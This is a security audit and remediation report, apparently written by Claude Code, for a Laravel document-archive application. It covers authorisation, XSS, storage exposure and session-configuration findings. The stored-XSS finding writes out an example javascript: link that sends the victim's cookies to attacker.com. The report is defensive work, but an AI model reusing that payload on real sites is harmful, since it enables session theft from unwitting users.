# Security Audit Report — pdf-markdown-pipeline

**Prepared for:** UP State Data Centre (SDC) / NIC Pre-Deployment Review  
**Audit date:** 2026-06-24  
**Remediation date:** 2026-06-24  
**Auditor:** Senior Web Application Security Architect (Claude Code)  
**Stack:** Laravel 13, PHP 8.4, MariaDB 12, Apache, local-first on-premise deployment  
**Scope (Pass 1):** Controllers, Form Requests, Models, Middleware, Blade views, Route configuration  
**Scope (Pass 2):** Login/auth Fortify stack, session configuration, password policy, rate limiting

---

## Status Summary

### Pass 1 — Application Layer

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| H-01 | Bulk force-delete had no audit trail or letter | HIGH | **FIXED** |
| H-02 | Bulk restore was scope-blind (cross-boundary IDOR) | HIGH | **FIXED** |
| M-01 | No security response headers | MEDIUM | **FIXED** |
| M-02 | Archive letters were publicly accessible via storage symlink | MEDIUM | **FIXED** |
| M-02b | Soft-deleted documents were directly accessible via storage URL | MEDIUM | **FIXED (revised M27)** |
| M-03 | Parsedown `javascript:` URI bypass (stored XSS vector) | MEDIUM | **FIXED** |
| L-01 | SVG accepted despite web-accessible storage | LOW | **FIXED** |
| L-02 | `original_filename` stored without sanitization | LOW | **FIXED** |
| L-03 | Department binding silently fell through to `department_level` for unknown aliases | LOW | **FIXED** |
| Rate | Upload rate limit was 60/min (3 GB/min worst-case) | MEDIUM | **FIXED** |

### Pass 2 — Auth / Fortify / Session Stack

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| A-01 | `FortifyServiceProvider` overwrote the dual-key login rate limiter, killing the per-IP cap | HIGH | **FIXED** |
| A-02 | `Password::defaults()` not configured — Fortify actions used bare min-8 rule | MEDIUM | **FIXED** |
| A-03 | `SESSION_SECURE_COOKIE` missing from `.env` — session cookie transmitted over HTTP | MEDIUM | **FIXED** |
| A-04 | "Remember me" checkbox enabled 5-year persistence, bypassing 120-min session timeout | MEDIUM | **FIXED** |
| A-05 | `SESSION_EXPIRE_ON_CLOSE=false` — session survived browser close on shared workstations | LOW | **FIXED** |
| A-06 | `SESSION_SAME_SITE=lax` — should be `strict` for internal government tool | LOW | **FIXED** |
| A-07 | `SESSION_ENCRYPT=false` — session data stored in plain text in the database | LOW | **FIXED** |
| A-08 | `APP_DEBUG=true` in `.env.example` — no production guidance in the template | LOW | **FIXED** |

| M-02b (revised) | Blanket `.htaccess` block replaced with physical file move on archive | MEDIUM | **FIXED (M27)** |

All findings across both audit passes have been remediated.

---

## Detailed Findings & Mitigations

---

### H-01 · Bulk Force-Delete Had No Audit Trail or Letter Requirement

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`bulkForceDestroy()` permanently deleted up to 100 documents in a single request with zero audit evidence — no reason captured, no `DocumentStatusHistory` rows written, no authorisation letter. The individual `forceDestroy()` correctly required a reason, a letter PDF, and wrote a history row. The bulk path had none of these.

**Attack / Compliance Impact:**  
A government document archive could be silently wiped via a single authenticated DELETE request with `{"ids": [1,2,3,...]}`. Violated IT Act 2000 Section 76 (preservation of electronic records).

**Fix applied:**

1. `BulkForceDestroyDocumentsRequest` — added `reason` field (`required|string|min:5|max:500`) with `prepareForValidation()` sanitation. Updated `authorize()` from `isAdmin()` to `hasPrivilege('documents.force-delete')` for consistency with the single-delete gate.

2. `DocumentController@bulkForceDestroy` — inside the loop, creates a `DocumentStatusHistory` row per document (`to_status = 'force_deleted'`, `note = $reason`) **before** `forceDelete()` executes.

3. `trash.blade.php` — the bulk "Delete Forever" button now shows a two-step Swal2 flow: first a textarea prompt (min 5 chars, validated client-side), then a final confirmation. The collected reason is injected as a hidden `<input name="reason">` before the form submits.

**Files changed:**  
`app/Http/Requests/BulkForceDestroyDocumentsRequest.php` · `app/Http/Controllers/DocumentController.php` · `resources/views/documents/trash.blade.php`

---

### H-02 · Bulk Restore Was Scope-Blind (Cross-Boundary IDOR)

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`BulkRestoreDocumentsRequest::authorize()` only checked `$this->user() !== null`. The controller checked `hasPrivilege('documents.restore')` (a privilege check), but the loop that restored documents performed **no per-document scope check**. A division-scoped operator with `documents.restore` could POST arbitrary trashed document IDs and restore documents from any other department.

**Fix applied:**

Inside `bulkRestore()`, added a per-document scope check before `$document->restore()`:

```php
if (! $authUser->isAdmin()) {
    $context = $document->division ?? $document->section ?? $document->ruleSet;
    if ($context && ! $authUser->canDeleteFrom($context)) {
        continue; // silently skip out-of-scope documents
    }
}
```

Admins bypass unconditionally. Non-admin users can only restore documents within their assigned scope, matching the behaviour of single-document restore and all other mutating operations.

**Files changed:**  
`app/Http/Controllers/DocumentController.php`

---

### M-01 · No Security Response Headers

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
Zero security response headers were set. NIC / STQC mandate `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, and `Permissions-Policy` on all government web applications.

**Fix applied:**

Created `app/Http/Middleware/SecurityHeaders.php` and registered it globally via `$middleware->append(...)` in `bootstrap/app.php` so every response — including error pages — carries these headers:

| Header | Value |
|--------|-------|
| `X-Frame-Options` | `SAMEORIGIN` |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'unsafe-inline' cdn.tailwindcss.com cdn.jsdelivr.net; ...` (see middleware for full policy) |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (HTTPS only — not sent over plain HTTP to avoid breaking local dev) |

**Note on `unsafe-inline`:** Tailwind Play CDN and the inline `<script>` blocks throughout the Blade views require `unsafe-inline`. This is acceptable for the current architecture. When the project migrates off the Play CDN to a compiled Tailwind build, replace `unsafe-inline` with explicit nonces or hashes for a stricter policy.

**Files changed:**  
`app/Http/Middleware/SecurityHeaders.php` (new) · `bootstrap/app.php`

---

### M-02 · Archive Letters and Archived Documents Were Publicly Accessible

**Severity:** MEDIUM  
**Status:** FIXED — two separate sub-issues addressed

#### M-02a · Archive Letters on Public Disk

**Vulnerability:**  
Authorisation letters uploaded during permanent deletion were stored on the `public` disk via `Storage::disk('public')->putFileAs('', ...)`. The `public` disk is symlinked to `public/storage/`. Any letter was directly accessible at `https://server/storage/archive_letters/{sequential_id}_{timestamp}.pdf` — no authentication required.

**Fix applied:**  
Changed to `Storage::disk('local')` (the private disk at `storage/app/private/`, no symlink):

```php
// Before
Storage::disk('public')->putFileAs('', $letterFile, $letterFilename);

// After
Storage::disk('local')->putFileAs('archive_letters', $letterFile, $letterBasename);
$letterPath = 'archive_letters/' . $letterBasename;
```

Rollback on transaction failure updated to use `Storage::disk('local')->delete(...)` as well.

**Note:** Archive letters are now stored at `storage/app/private/archive_letters/`. They are not web-accessible by any URL. If an admin needs to retrieve a specific letter, access is via the filesystem directly (or add a dedicated admin-only download route in a future iteration).

#### M-02b · Archived Documents Moved to Private Disk on Soft-Delete

**Vulnerability:**  
Soft-deleted (archived) documents remained on the `public` disk at their original vault path. Because `public/storage/` is a symlink to that disk, anyone who knew or guessed the storage URL (e.g. `https://server/storage/document_vault/.../file.pdf`) could retrieve them directly — bypassing the application's soft-delete check entirely.

**Initial fix (M24):** Blanket `.htaccess` 403 rule blocking all of `/storage/document_vault/`.

**Revised fix (M27):** The blanket block was removed because it also prevented direct URL sharing and search-engine indexing of **active** public documents — an intentional feature of the vault. The correct fix is at the file layer: when a document is soft-deleted, its files are **physically moved** from the `public` disk to the private `local` disk (`storage/app/private/archived_documents/{id}.pdf`). When restored, files are moved back. This way:

| Document state | File location | Web-accessible |
|---|---|---|
| Active, `visibility=public` | `public` disk → `/storage/document_vault/…` | ✓ Yes — by design |
| Active, `visibility=authenticated` | `public` disk | URL not published; controller enforces auth |
| Archived (soft-deleted) | `local` disk → `storage/app/private/archived_documents/` | ✗ Never |

**`ManagesDocumentFiles` trait** (`app/Http/Controllers/Concerns/ManagesDocumentFiles.php`) provides three methods used by `DocumentController` and `RuleSetController`:
- `archiveFiles(Document)` — moves PDF + Markdown to private disk after soft-delete
- `restoreFiles(Document)` — moves files back to public disk vault path after restore
- `deleteArchivedFiles(Document)` — deletes from private disk on permanent deletion

File moves happen **after** the DB transaction so a failed file move never prevents the database state from committing. Failures are logged as warnings (non-fatal) — the document's archived/restored state is determined by `deleted_at`, not file location.

**`.htaccess` change:** The `document_vault` block is removed. The `archive_letters` block is retained as a defence-in-depth fallback only.

**Files changed:**  
`app/Http/Controllers/Concerns/ManagesDocumentFiles.php` (new) · `app/Http/Controllers/DocumentController.php` · `app/Http/Controllers/RuleSetController.php` · `public/.htaccess`

---

### M-03 · Parsedown `javascript:` URI Bypass (Stored XSS)

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
Extracted Markdown content was rendered with:

```php
{!! \Parsedown::instance()->setSafeMode(true)->text($markdown) !!}
```

`Parsedown::setSafeMode(true)` (package `erusev/parsedown ^1.0`) strips raw `<script>` blocks but does **not** sanitize `javascript:`, `data:`, or `vbscript:` URI schemes in `href` and `src` attributes. The `{!! !!}` syntax bypasses Blade's auto-escaping, so the output is injected verbatim.

**Attack chain:** A crafted Word document or SVG (now blocked — see L-01) containing a URL like `[Circular](javascript:document.location='https://attacker.com/?c='+document.cookie)` → `markitdown` extracts it as Markdown → Parsedown renders it as an `<a href="javascript:...">` → admin opening the review page executes the payload.

**Fix applied:**  
After Parsedown renders the HTML, a `preg_replace` strips any `href` or `src` attribute whose value begins with `javascript:`, `data:`, or `vbscript:`, replacing it with `href="#"`:

```php
$mdHtml = preg_replace(
    '/\b(href|src)\s*=\s*(["\'])(?:javascript|data|vbscript):[^"\']*\2/i',
    '$1=$2#$2',
    $mdHtml
);
```

This is a defence-in-depth layer. No new Composer dependency is introduced. For an even stricter fix, `ezyang/htmlpurifier` with `URI.AllowedSchemes = ['http', 'https', 'mailto']` can be added later.

**Files changed:**  
`resources/views/documents/show.blade.php`

---

### L-01 · SVG Accepted Despite Web-Accessible Storage

**Severity:** LOW → removed attack surface  
**Status:** FIXED

**Vulnerability:**  
`image/svg+xml` was in `StoreDocumentRequest::ACCEPTED_MIMETYPES`. SVG is XML and can contain `<script>` tags and event handlers. Even with the forced `.pdf` storage extension (which partially mitigated browser execution), accepting SVG was an unnecessary attack surface that enabled the M-03 chain via `markitdown` text extraction.

**Fix applied:**  
Removed `image/svg+xml` from `ACCEPTED_MIMETYPES`. The error message updated to explicitly state "SVG files are not permitted." No government or general document workflow requires SVG uploads.

**Files changed:**  
`app/Http/Requests/StoreDocumentRequest.php`

---

### L-02 · `original_filename` Stored Without Sanitization

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
`$request->file('file')->getClientOriginalName()` was stored as-is in the `original_filename` column and later used in `Content-Disposition: inline; filename="..."` response headers. A filename containing embedded double-quotes could theoretically escape the header attribute value. While Symfony's `HeaderBag` strips CR/LF characters (blocking the most dangerous injection), unescaped quotes are RFC non-compliant.

**Fix applied:**  
Filename sanitized before storage using a permissive allowlist that preserves readable names:

```php
preg_replace('/[^\w\s\-\.\(\)]/', '_', $request->file('file')->getClientOriginalName())
```

Replaces any character outside word chars, spaces, hyphens, dots, and parentheses with `_`. Preserves common filename patterns like `GO-123 (2024).pdf` while eliminating `"`, `<`, `>`, `;`, and other special characters.

**Files changed:**  
`app/Http/Controllers/DocumentController.php`

---

### L-03 · Department Binding Silent Default for Unknown Level Aliases

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
The `{department}` route binding used `default => 'department_level'` in its `match` expression, meaning any unrecognised `{level}` alias (e.g. `/documents/xyz/...`) silently resolved to `department_level` instead of returning 404. While not directly exploitable, it masked routing bugs and created undocumented implicit behaviour.

**Fix applied:**  
Replaced with an explicit two-branch match that aborts 404 for any unrecognised alias:

```php
$level = match($alias) {
    'dept'  => 'department_level',
    'sectt' => 'secretariat_level',
    default => abort(404),
};
```

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

### Upload Rate Limit Capped

**Severity:** MEDIUM (operational risk)  
**Status:** FIXED

**Previous behaviour:**  
Upload limiter was 60 requests/minute per user — matching the general mutations limiter. At a 50 MB file cap, worst-case throughput was 3 GB/min per user.

**Fix applied:**  
Reduced to 20 requests/minute. This still allows comfortable bulk initial-data-entry batches (20 files/min) while capping worst-case disk I/O at 1 GB/min. Once the initial document load is complete and uploads are 1–2 files at a time, reduce further to 5–10/min by changing the single constant in `AppServiceProvider::configureRateLimiters()`.

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

## Passing Checks — Confirmed Pre-Existing (No Remediation Required)

The following areas were audited and found to be correctly implemented before this remediation pass.

| Area | Verdict |
|------|---------|
| Authenticated action audit trail (`activity_logs`, `LogMutation` middleware, Login listener) | ✓ PASS |
| File upload MIME validation (`mimetypes:` magic-byte check, not `mimes:`) | ✓ PASS |
| Directory traversal via vault path (slugs go through `HasUnicodeSlug::makeSlug()`) | ✓ PASS |
| Privilege escalation via `UpdateProfileRequest` (no role/privilege fields on self-edit) | ✓ PASS |
| CSRF protection (all mutations in `web` middleware group; AJAX sets `X-CSRF-TOKEN`) | ✓ PASS |
| SQL injection (Eloquent/Query Builder parameterized bindings throughout) | ✓ PASS |
| Mass assignment protection (explicit `$fillable` on all models, no `$guarded = []`) | ✓ PASS |
| Login brute-force rate limiting (5/min per email+IP + 10/min per IP — dual-key, fixed in A-01) | ✓ PASS |
| XSS via Blade auto-escape (`{{ }}` on all user data in templates) | ✓ PASS |
| Self-delete guard in `UserManagementController@destroy` | ✓ PASS |
| Two-stage soft/hard delete (files never removed on soft-delete) | ✓ PASS |
| `prepareForValidation()` sanitation on all Form Requests | ✓ PASS |
| Password not logged (`$request->except(['password', 'password_confirmation'])`) | ✓ PASS |
| Admin routes double-gated (`is_admin` middleware + Form Request `authorize()`) | ✓ PASS |
| Privilege whitelist enforced at validation (`User::PRIVILEGES` `in:` rule) | ✓ PASS |

---

## Pass 2 — Detailed Findings & Mitigations (Auth / Fortify / Session)

---

### A-01 · `FortifyServiceProvider` Overwrote the Dual-Key Login Rate Limiter

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`AppServiceProvider::configureRateLimiters()` defined a dual-key `login` limiter:
- 5 attempts per minute keyed by `email + IP` (prevents targeted account brute-force)
- 10 attempts per minute keyed by `IP` alone (prevents credential-stuffing one IP across many accounts)

`FortifyServiceProvider::boot()` also called `RateLimiter::for('login', ...)` with a single-key limiter (email+IP only, 5/min). Service providers boot in registration order — `FortifyServiceProvider` is listed after `AppServiceProvider` in `bootstrap/providers.php`. The second `RateLimiter::for('login')` call silently **replaced** the first, discarding the IP-only cap entirely. An attacker could spray thousands of email+password combinations from a single IP at 5 attempts per email per minute, unlimited across emails.

**Fix applied:**  
Removed the duplicate `RateLimiter::for('login', ...)` block from `FortifyServiceProvider`. The view registration (`Fortify::loginView(...)`) is preserved. The `AppServiceProvider` dual-key definition is now the sole, authoritative limiter.

**Files changed:**  
`app/Providers/FortifyServiceProvider.php`

---

### A-02 · `Password::defaults()` Not Configured — Fortify Actions Used Bare min-8 Rule

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
`PasswordValidationRules::passwordRules()` (used by all Fortify action classes) returns `Password::default()`. Without a `Password::defaults(fn...)` call in any service provider, `Password::default()` resolved to a bare `Password(min: 8)` — no mixed case, no numbers, no symbols. Meanwhile `StoreUserRequest`, `UpdateUserRequest`, and `UpdateProfileRequest` all correctly used `Password::min(8)->mixedCase()->numbers()->symbols()`. This divergence meant that if Fortify password reset or profile update features were ever re-enabled, they would accept `12345678` where the admin form would reject it.

**Fix applied:**  
Added to `AppServiceProvider::boot()` (before rate limiters):

```php
Password::defaults(
    fn () => Password::min(8)->mixedCase()->numbers()->symbols()
);
```

All uses of `Password::default()` — both in Fortify actions and any future Form Requests — now resolve to the same strong policy without duplicating the rule.

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

### A-03 · `SESSION_SECURE_COOKIE` Not Set

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
`config/session.php` reads `env('SESSION_SECURE_COOKIE')` which defaults to `null` (falsy). Neither `.env` nor `.env.example` set this key. On the SDC HTTPS deployment, the session cookie would be transmitted without the `Secure` flag — allowing it to be sent over a plain HTTP connection if a user navigates to `http://` before the HTTPS redirect fires, or if an intermediate proxy strips TLS.

**Fix applied:**  
- Added `SESSION_SECURE_COOKIE=false` to `.env` (local HTTP dev — correct)
- Added `SESSION_SECURE_COOKIE=false` to `.env.example` with a comment: **PRODUCTION (HTTPS): must be `true`**

The production `.env` on the SDC server must set this to `true`.

**Files changed:**  
`.env` · `.env.example`

---

### A-04 · "Remember Me" Checkbox Enabled 5-Year Session Persistence

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
The login form included a "Keep me signed in" checkbox (`name="remember"`). When checked, Fortify/Laravel sets a long-lived remember-me cookie (default: 5 years via `remember_token`). This completely bypasses the 120-minute `SESSION_LIFETIME`. On a shared government workstation where an officer checks this box, the account remains accessible indefinitely across browser restarts, OS logins, and shift changes.

**Fix applied:**  
Removed the remember-me checkbox and label from `resources/views/auth/login.blade.php`. Sessions are now bounded exclusively by `SESSION_LIFETIME` (120 minutes) and `SESSION_EXPIRE_ON_CLOSE` (now `true`).

**Files changed:**  
`resources/views/auth/login.blade.php`

---

### A-05 · `SESSION_EXPIRE_ON_CLOSE=false`

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
With the default `false`, closing the browser window did not invalidate the session. The 120-minute TTL continued to tick from the last request. On a shared desktop, another user opening the browser shortly after could resume an active authenticated session.

**Fix applied:**  
Set `SESSION_EXPIRE_ON_CLOSE=true` in `.env` and `.env.example`. Sessions now expire when the browser closes, in addition to the 120-minute inactivity timeout.

**Files changed:**  
`.env` · `.env.example`

---

### A-06 · `SESSION_SAME_SITE=lax`

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
`lax` allows the session cookie to be sent on top-level cross-site navigations (e.g., clicking an external link that redirects to this app). For an internal government tool with no OAuth flows or external redirect dependencies, `strict` is the correct value — it prevents the session cookie from being attached to any cross-site request, even GET navigations from external pages.

**Fix applied:**  
Set `SESSION_SAME_SITE=strict` in `.env` and `.env.example`. CSRF tokens still protect all mutations; `strict` adds an additional layer for session-based attacks.

**Files changed:**  
`.env` · `.env.example`

---

### A-07 · `SESSION_ENCRYPT=false` — Session Data in Plain Text

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
Session data (including authentication state, CSRF tokens, and flash messages) was stored unencrypted in the `sessions` table. Direct database read access — possible for a DBA, backup process, or compromised DB credential — would expose active session tokens that could be used to impersonate authenticated users without knowing their passwords.

**Fix applied:**  
Set `SESSION_ENCRYPT=true` in `.env` and `.env.example`. Laravel encrypts session data using `APP_KEY` before writing to the DB. `APP_KEY` must be set and kept secret.

**Files changed:**  
`.env` · `.env.example`

---

### A-08 · `APP_DEBUG=true` in `.env.example` Without Production Warning

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
`.env.example` had `APP_DEBUG=true` with no warning. A developer deploying to the SDC server by copying `.env.example` verbatim would run the application in debug mode, exposing full stack traces (including DB credentials, file paths, and application internals) to any user who triggered an error.

**Fix applied:**  
Added inline production-guidance comments to `APP_ENV` and `APP_DEBUG` in `.env.example`:
```
APP_ENV=local    # PRODUCTION: set to 'production'
APP_DEBUG=true   # PRODUCTION: must be 'false' — true leaks stack traces
```

**Files changed:**  
`.env.example`

---

## Passing Checks — Confirmed Pre-Existing (No Remediation Required)

These are not vulnerabilities in the current state but should be addressed before the application handles sensitive classified data.

1. **Migrate off Tailwind Play CDN** — Use a compiled Tailwind build so `unsafe-inline` can be removed from the CSP `script-src` directive, replacing it with explicit nonces. Play CDN is not suitable for production NIC deployments.

2. **Add `ezyang/htmlpurifier`** — Replace the `preg_replace` Parsedown post-processor (M-03) with a full HTML purifier for a more robust allowlist-based approach. Relevant once Markdown extraction is in active use.

3. **Tighten upload rate limit after initial data entry** — Change `Limit::perMinute(20)` to `Limit::perMinute(5)` in `AppServiceProvider::configureRateLimiters()` once the legacy document backlog is loaded.

4. **Add an admin-only archive-letter download route** — Archive letters are now on the private disk (inaccessible via URL). Add `GET /admin/archive-letters/{document_id}` → streams from `Storage::disk('local')` after `hasPrivilege('documents.force-delete')` check, so admins can retrieve letters without filesystem access.

5. **Enable HSTS preload after HTTPS is stable** — Once the SDC deployment has a stable TLS certificate, add `preload` to the HSTS header and submit the domain to the HSTS preload list.

6. **Add `activity_logs` retention/rotation policy** — The table is append-only with no TTL. For long-running deployments define a retention window (e.g. 1–2 years) and a scheduled `php artisan` command to hard-delete rows older than that threshold. Log rows older than the retention window lose legal relevance anyway. Alternatively, export aged rows to a CSV/archive before deletion.

---

*Audit and remediation completed 2026-06-24. Re-audit recommended after any significant change to upload, authentication, or access-control logic.*
